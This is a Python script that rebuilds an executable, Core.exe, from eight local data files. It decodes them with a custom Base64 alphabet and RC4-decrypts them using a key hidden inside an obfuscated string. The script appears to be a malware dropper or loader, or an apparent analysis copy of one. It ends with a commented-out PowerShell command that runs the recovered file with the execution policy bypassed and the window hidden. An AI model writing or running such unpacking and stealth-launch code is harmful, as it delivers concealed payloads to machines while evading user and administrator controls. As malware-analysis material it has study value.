import os
MOD = 256

# Custom Base64 mapping updated per user
base64_dict = {
    '110000': 'w',
    '110001': 'x',
    '110101': '1',
    '110100': '0',
    '010100': 'U',
    '010101': 'V',
    '001100': 'M',
    '001101': 'N',
    '011110': 'e',
    '011111': 'f',
    '001001': 'J',
    '001000': 'I',
    '011011': 'b',
    '011010': 'a',
    '000110': 'G',
    '000111': 'H',
    '000011': 'D',
    '000010': 'C',
    '100100': 'k',
    '100101': 'l',
    '111100': '8',
    '111101': '9',
    '100010': 'i',
    '100011': 'j',
    '101110': 'u',
    '101111': 'v',
    '111001': '5',
    '111000': '4',
    '101011': 'r',
    '101010': 'q',
    '110011': 'z',
    '110010': 'y',
    '010010': 'S',
    '010011': 'T',
    '010111': 'X',
    '010110': 'W',
    '110110': '2',
    '110111': '3',
    '011000': 'Y',
    '011001': 'Z',
    '001111': 'P',
    '001110': 'O',
    '011101': 'd',
    '011100': 'c',
    '001010': 'K',
    '001011': 'L',
    '101101': 't',
    '000000': 'A',
    '000001': 'B',
    '100111': 'n',
    '100110': 'm',
    '000101': 'F',
    '000100': 'E',
    '111111': '/',
    '111110': '+',
    '100001': 'h',
    '100000': 'g',
    '010001': 'R',
    '010000': 'Q',
    '101100': 's',
    '111010': '6',
    '111011': '7',
    '101000': 'o',
    '101001': 'p'
}

# Reverse lookup: character to 6-bit binary
reverse_dict = {v: k for k, v in base64_dict.items()}


def br4c3(ct: str) -> bytes:
    """
    Custom decode: remove '=' then map each char to its 6-bit binary
    and reassemble into bytes.
    """
    ct = ct.replace('=', '')
    bits = ''
    for ch in ct:
        if ch in reverse_dict:
            bits += reverse_dict[ch]
    octets = [bits[i:i+8] for i in range(0, len(bits), 8)]
    if octets and len(octets[-1]) != 8:
        octets.pop()
    data = b''
    for byte in octets:
        data += int(byte, 2).to_bytes(1, 'big')
    return data


def KSA(key: bytes) -> list:
    """Key Scheduling Algorithm for RC4"""
    S = list(range(MOD))
    j = 0
    for i in range(MOD):
        j = (j + S[i] + key[i % len(key)]) % MOD
        S[i], S[j] = S[j], S[i]
    return S


def PRGA(S: list):
    """Pseudo-Random Generation Algorithm"""
    i = j = 0
    while True:
        i = (i + 1) % MOD
        j = (j + S[i]) % MOD
        S[i], S[j] = S[j], S[i]
        yield S[(S[i] + S[j]) % MOD]


def encrypt_logic(key: bytes, data: bytes) -> bytes:
    ks = PRGA(KSA(key))
    return bytes(b ^ next(ks) for b in data)

def encrypt(key: bytes, plaintext: bytes) -> bytes:
    return encrypt_logic(key, plaintext)

def decrypt(key: bytes, ciphertext: bytes) -> bytes:
    return encrypt_logic(key, ciphertext)

def retr(specif: str, ficeps: str, s: str) -> bytes:
    """Extract printable-range chars as key material and return bytes."""
    return bytes([ord(ch) for ch in s if specif <= ch <= ficeps])

if __name__ == '__main__':
    # Read local data_1 -> data_8
    rac = ''
    for i in range(1, 9):
        with open(f'data_{i}', 'r') as f:
            rac += f.read()
    # Extract RC4 key and reverse
    string = 'ÆÍ\tÜùïÔÓ©·èÕo¿\bÇÎÎµöæ¨\f¼y¶øäíÙß ÃÜiªórÄoÊµsÇÅ ¿×¥eÉª¢Àr\v×i¢ÿ½hÃ­ØÕsÛ¼×ú\n÷Ü«£aÞÈä´ñêÊÓÆ¡ÐÃ°ðî¬h³ú®ÅÅÉÛµ¯'

    key = retr(' ', '~', string)[::-1]
    # Decode and decrypt payload
    payload = br4c3(rac)
    core = decrypt(key, payload)
    # Write Core.exe
    with open('Core.exe', 'wb') as f:
        f.write(core)
    print('[+] Core.exe has been restored.')
# Chạy file
# os.system('powershell.exe -eXeCUtiOnpOlICy BYpAss -WiNdOWstYlE hiDdEn .\\Core.exe')